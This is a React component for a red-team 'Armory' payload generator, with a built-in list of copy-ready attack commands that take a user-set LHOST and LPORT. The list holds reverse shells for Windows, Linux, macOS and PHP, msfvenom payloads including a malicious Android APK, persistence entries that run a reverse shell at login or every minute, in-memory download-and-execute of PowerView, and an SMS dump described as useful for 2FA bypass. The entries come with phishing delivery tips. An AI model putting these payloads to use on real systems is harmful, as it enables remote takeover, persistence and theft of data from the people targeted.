import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Terminal, Copy, Check, Zap, Cpu, Shield, Globe, Monitor, Smartphone, Apple, Info } from 'lucide-react';
import { cn } from '@/lib/utils';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';

interface PayloadTemplate {
  id: string;
  name: string;
  platform: 'Windows' | 'Linux' | 'Android' | 'Web' | 'macOS';
  type: 'Reverse Shell' | 'Payload' | 'Script' | 'One-Liner' | 'Persistence' | 'Enumeration';
  command: string;
  description: string;
  notes?: string;
  exploitDetails?: string;
}

const PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  // Windows
  {
    id: 'win-ps-rev',
    name: 'PowerShell Reverse Shell',
    platform: 'Windows',
    type: 'Reverse Shell',
    command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    description: 'A stealthy PowerShell reverse shell that bypasses execution policies and runs in a hidden window.',
    notes: 'Requires PowerShell 2.0+. Use "nc -lvnp {LPORT}" on your listener.',
    exploitDetails: 'Typically delivered via Phishing (T1566) using a malicious document or shortcut file. Linked to Command and Scripting Interpreter (T1059.001).'
  },
  {
    id: 'win-msf-exe',
    name: 'MSFVenom Windows EXE',
    platform: 'Windows',
    type: 'Payload',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe',
    description: 'Generates a standard Windows 64-bit executable payload for Meterpreter access.',
    notes: 'Use "exploit/multi/handler" in Metasploit with the same payload settings.',
    exploitDetails: 'Delivered via User Execution (T1204.002) or as part of a lateral movement toolset. Provides a base for further Discovery (TA0007) and Collection (TA0009).'
  },
  {
    id: 'win-reg-persist',
    name: 'Registry Run Key Persistence',
    platform: 'Windows',
    type: 'Persistence',
    command: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\payload.exe" /f',
    description: 'Adds a payload to the current user\'s Run registry key for persistence on login.',
    notes: 'Payload must be dropped at the specified path first. Stealthier than Startup folder.',
    exploitDetails: 'Used during the Persistence (TA0003) phase. Specifically Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001).'
  },
  {
    id: 'win-powerview-enum',
    name: 'PowerView Domain Enum',
    platform: 'Windows',
    type: 'Enumeration',
    command: 'IEX (New-Object Net.WebClient).DownloadString("http://{LHOST}/PowerView.ps1"); Get-NetDomainController; Get-NetUser | select samaccountname, description',
    description: 'Downloads and executes PowerView in memory to enumerate domain information.',
    notes: 'Requires network access to your LHOST. Use "python3 -m http.server 80" to host the script.',
    exploitDetails: 'Part of the Discovery (TA0007) phase. Used to identify high-value targets for Lateral Movement (TA0008) like Domain Admins.'
  },
  {
    id: 'win-certutil-dl',
    name: 'Certutil File Download',
    platform: 'Windows',
    type: 'One-Liner',
    command: 'certutil.exe -urlcache -split -f http://{LHOST}/payload.exe payload.exe',
    description: 'Living-off-the-land technique to download files using the built-in certutil utility.',
    notes: 'Often flagged by modern EDRs. Use -f to force overwrite.',
    exploitDetails: 'Used for Ingress Tool Transfer (T1105). Leverages a signed binary (LOLBAS) to bypass basic application control.'
  },

  // Linux
  {
    id: 'lin-bash-rev',
    name: 'Bash TCP Reverse Shell',
    platform: 'Linux',
    type: 'Reverse Shell',
    command: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    description: 'Classic bash reverse shell using the built-in /dev/tcp device file.',
    notes: 'Does not work on systems where /dev/tcp is disabled (e.g., some Debian/Ubuntu versions).',
    exploitDetails: 'Commonly used in Command Injection (T1059.004) or as a payload in Exploit Public-Facing Application (T1190).'
  },
  {
    id: 'lin-py-rev',
    name: 'Python3 Reverse Shell',
    platform: 'Linux',
    type: 'One-Liner',
    command: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'',
    description: 'A robust Python3 one-liner that provides a fully interactive PTY shell.',
    notes: 'PTY spawn allows for tab completion and job control. Use "stty raw -echo; fg" on listener.',
    exploitDetails: 'Leverages Python (T1059.006) for cross-platform execution. Often used after initial access to gain a more stable shell.'
  },
  {
    id: 'lin-cron-persist',
    name: 'Crontab Persistence',
    platform: 'Linux',
    type: 'Persistence',
    command: '(crontab -l ; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'") | crontab -',
    description: 'Adds a reverse shell to the user\'s crontab to execute every minute.',
    notes: 'Check "crontab -l" to verify. Very noisy but effective for quick persistence.',
    exploitDetails: 'Implements Scheduled Task/Job: Cron (T1053.003) for Persistence (TA0003).'
  },
  {
    id: 'lin-suid-enum',
    name: 'SUID Binary Search',
    platform: 'Linux',
    type: 'Enumeration',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    description: 'Searches for binaries with the SUID bit set, which can lead to privilege escalation.',
    notes: 'Cross-reference results with GTFOBins for exploitation methods.',
    exploitDetails: 'Part of Privilege Escalation (TA0004). Specifically Abuse Elevation Control Mechanism: Setuid and Setgid (T1548.001).'
  },

  // macOS
  {
    id: 'mac-zsh-rev',
    name: 'macOS Zsh Reverse Shell',
    platform: 'macOS',
    type: 'Reverse Shell',
    command: 'zsh -c "zmodload zsh/net/tcp && ztcp {LHOST} {LPORT} && zsh <&$REPLY >&$REPLY 2>&$REPLY"',
    description: 'Native Zsh reverse shell using the zsh/net/tcp module, common in modern macOS.',
    notes: 'Zsh is the default shell on macOS 10.15+. This is a native, fileless method.',
    exploitDetails: 'Used in Command and Scripting Interpreter: Unix Shell (T1059.004). Native modules are harder to detect than external binaries.'
  },
  {
    id: 'mac-launch-persist',
    name: 'LaunchAgent Persistence',
    platform: 'macOS',
    type: 'Persistence',
    command: 'echo \'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.sys.update</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>\' > ~/Library/LaunchAgents/com.sys.update.plist && launchctl load ~/Library/LaunchAgents/com.sys.update.plist',
    description: 'Creates a LaunchAgent to execute a reverse shell every time the user logs in.',
    notes: 'Plists in ~/Library/LaunchAgents run as the user. Requires no root privileges.',
    exploitDetails: 'Implements Create or Modify System Process: Launch Agent (T1543.001) for Persistence (TA0003).'
  },
  {
    id: 'mac-tcc-enum',
    name: 'TCC Database Check',
    platform: 'macOS',
    type: 'Enumeration',
    command: 'ls -ld ~/Library/Application\ Support/com.apple.TCC/TCC.db',
    description: 'Checks for access to the TCC (Transparency, Consent, and Control) database.',
    notes: 'If readable, you can dump permissions for camera, microphone, and full disk access.',
    exploitDetails: 'Used for Discovery (TA0007) of user permissions. Can lead to bypassing TCC via CVEs or misconfigurations.'
  },

  // Android
  {
    id: 'and-msf-apk',
    name: 'MSFVenom Android APK',
    platform: 'Android',
    type: 'Payload',
    command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} R > update.apk',
    description: 'Generates a malicious Android APK that provides a Meterpreter session when installed.',
    notes: 'Requires "Unknown Sources" to be enabled on the target device.',
    exploitDetails: 'Delivered via Malicious Application (T1474) or Phishing (T1566). Targets mobile users for Collection (TA0009).'
  },
  {
    id: 'and-sms-dump',
    name: 'ADB SMS Dump',
    platform: 'Android',
    type: 'Enumeration',
    command: 'adb shell content query --uri content://sms --projection _id,address,body,date',
    description: 'Dumps all SMS messages from the device via ADB.',
    notes: 'Requires ADB access and the device to be unlocked. Useful for 2FA bypass.',
    exploitDetails: 'Used in the Collection (TA0009) phase. Specifically Data from Local System (T1005) on mobile devices.'
  },

  // Web
  {
    id: 'web-php-rev',
    name: 'PHP Reverse Shell',
    platform: 'Web',
    type: 'Script',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: 'A simple PHP one-liner to establish a reverse shell from a web server.',
    notes: 'Commonly used in file upload vulnerabilities or LFI-to-RCE scenarios.',
    exploitDetails: 'Exploits Server-Side Software Vulnerabilities (T1190). Often the first step after gaining code execution on a web server.'
  },
  {
    id: 'web-jsp-rev',
    name: 'JSP Reverse Shell',
    platform: 'Web',
    type: 'Script',
    command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war',
    description: 'Generates a WAR file containing a JSP reverse shell for Tomcat/JBoss servers.',
    notes: 'Deploy via the manager interface or directory traversal vulnerabilities.',
    exploitDetails: 'Targets Web Servers (T1190) or Application Servers. WAR deployment is a common way to gain persistence on Java-based web apps.'
  }
];

export const Armory: React.FC = () => {
  const [lhost, setLhost] = useState('10.10.10.10');
  const [lport, setLport] = useState('4444');
  const [selectedPlatform, setSelectedPlatform] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const filteredPayloads = selectedPlatform 
    ? PAYLOAD_TEMPLATES.filter(p => p.platform === selectedPlatform)
    : PAYLOAD_TEMPLATES;

  const generateCommand = (template: string) => {
    return template.replace(/{LHOST}/g, lhost).replace(/{LPORT}/g, lport);
  };

  const handleCopy = (id: string, command: string) => {
    navigator.clipboard.writeText(generateCommand(command));
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="h-full flex flex-col bg-black/10 overflow-hidden">
      <div className="p-4 lg:p-10 border-b border-obsidian-border bg-obsidian-bg/80 backdrop-blur-xl">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-6 lg:mb-10 gap-4 lg:gap-6">
          <div className="flex items-center gap-3 lg:gap-4">
            <div className="w-10 h-10 lg:w-12 lg:h-12 rounded-xl lg:rounded-2xl bg-accent/10 flex items-center justify-center border border-accent/20 shrink-0">
              <Zap className="w-5 h-5 lg:w-6 lg:h-6 text-accent" />
            </div>
            <div>
              <h2 className="text-xl lg:text-2xl font-bold text-text-primary tracking-tight">The Armory</h2>
              <p className="text-[10px] lg:text-xs font-medium text-text-secondary uppercase tracking-widest">Payload Generator</p>
            </div>
          </div>
          <div className="flex items-center gap-4 lg:gap-6">
            <div className="flex flex-col gap-1 lg:gap-1.5 flex-1">
              <span className="text-[8px] lg:text-[10px] font-bold text-text-secondary uppercase tracking-widest">LHOST</span>
              <input 
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                className="bg-obsidian-card border border-obsidian-border rounded-lg px-3 lg:px-4 py-1.5 lg:py-2 text-[10px] lg:text-sm font-mono text-accent focus:outline-none focus:ring-2 focus:ring-accent/20 transition-all w-full sm:w-32 lg:w-40"
              />
            </div>
            <div className="flex flex-col gap-1 lg:gap-1.5">
              <span className="text-[8px] lg:text-[10px] font-bold text-text-secondary uppercase tracking-widest">LPORT</span>
              <input 
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                className="bg-obsidian-card border border-obsidian-border rounded-lg px-3 lg:px-4 py-1.5 lg:py-2 text-[10px] lg:text-sm font-mono text-accent focus:outline-none focus:ring-2 focus:ring-accent/20 transition-all w-20 lg:w-24"
              />
            </div>
          </div>
        </div>

        <div className="flex gap-3 overflow-x-auto pb-2 custom-scrollbar">
          {['Windows', 'Linux', 'macOS', 'Android', 'Web'].map((platform) => (
            <Button
              key={platform}
              variant="ghost"
              size="sm"
              onClick={() => setSelectedPlatform(selectedPlatform === platform ? null : platform)}
              className={cn(
                "font-medium text-xs rounded-lg px-5 py-2 transition-all shrink-0 border",
                selectedPlatform === platform 
                  ? "bg-accent text-white border-accent shadow-lg shadow-accent/20" 
                  : "bg-white/5 text-text-secondary border-obsidian-border hover:border-accent/50 hover:text-text-primary"
              )}
            >
              {platform === 'Windows' && <Monitor className="w-3.5 h-3.5 mr-2" />}
              {platform === 'Linux' && <Cpu className="w-3.5 h-3.5 mr-2" />}
              {platform === 'macOS' && <Apple className="w-3.5 h-3.5 mr-2" />}
              {platform === 'Android' && <Smartphone className="w-3.5 h-3.5 mr-2" />}
              {platform === 'Web' && <Globe className="w-3.5 h-3.5 mr-2" />}
              {platform}
            </Button>
          ))}
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-4 lg:p-10 custom-scrollbar">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 lg:gap-8">
          {filteredPayloads.map((payload) => (
            <motion.div
              key={payload.id}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
            >
              <Card className="pro-card p-4 lg:p-8 hover:border-accent/30 transition-all group">
                <div className="flex items-start justify-between mb-4 lg:mb-6">
                  <div>
                    <div className="flex items-center gap-2 mb-1.5 lg:mb-2">
                      <Badge variant="outline" className="text-[8px] lg:text-[10px] font-bold border-accent/20 text-accent uppercase tracking-widest">
                        {payload.platform}
                      </Badge>
                      <Badge variant="outline" className="text-[8px] lg:text-[10px] font-bold border-white/10 text-text-secondary uppercase tracking-widest">
                        {payload.type}
                      </Badge>
                    </div>
                    <h3 className="text-base lg:text-lg font-bold text-text-primary group-hover:text-accent transition-colors">{payload.name}</h3>
                  </div>
                  <Button
                    size="icon"
                    variant="ghost"
                    onClick={() => handleCopy(payload.id, payload.command)}
                    className="text-text-secondary hover:text-accent hover:bg-accent/10 rounded-xl w-8 h-8 lg:w-10 lg:h-10"
                  >
                    {copiedId === payload.id ? <Check className="w-4 h-4 lg:w-5 lg:h-5" /> : <Copy className="w-4 h-4 lg:w-5 lg:h-5" />}
                  </Button>
                </div>
                
                <p className="text-xs lg:text-sm text-text-secondary mb-4 lg:mb-6 leading-relaxed">
                  {payload.description}
                </p>

                {payload.notes && (
                  <div className="mb-4 lg:mb-6 p-3 lg:p-4 rounded-xl bg-accent/5 border border-accent/10">
                    <div className="flex items-center gap-2 mb-1.5 lg:mb-2">
                      <Info className="w-3.5 h-3.5 lg:w-4 lg:h-4 text-accent" />
                      <span className="text-[8px] lg:text-[10px] font-bold text-accent uppercase tracking-widest">Usage Notes</span>
                    </div>
                    <p className="text-[10px] lg:text-xs text-text-secondary leading-relaxed italic">
                      {payload.notes}
                    </p>
                  </div>
                )}

                <div className="relative group/cmd">
                  <div className="absolute -top-2 left-3 lg:-top-2.5 lg:left-4 px-1.5 lg:px-2 bg-obsidian-card text-[8px] lg:text-[10px] font-bold text-text-secondary/50 uppercase tracking-widest">
                    Command
                  </div>
                  <Button
                    size="icon"
                    variant="ghost"
                    onClick={() => handleCopy(payload.id, payload.command)}
                    className="absolute top-2 right-2 lg:top-3 lg:right-3 w-7 h-7 lg:w-8 lg:h-8 text-text-secondary/30 hover:text-accent hover:bg-accent/10 opacity-0 group-hover/cmd:opacity-100 transition-opacity rounded-lg"
                  >
                    {copiedId === payload.id ? <Check className="w-3.5 h-3.5 lg:w-4 lg:h-4" /> : <Copy className="w-3.5 h-3.5 lg:w-4 lg:h-4" />}
                  </Button>
                  <div className="bg-black/40 rounded-xl p-4 lg:p-5 pr-10 lg:pr-12 font-mono text-[10px] lg:text-xs text-terminal-green break-all border border-obsidian-border">
                    {generateCommand(payload.command)}
                  </div>
                </div>
              </Card>
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
};
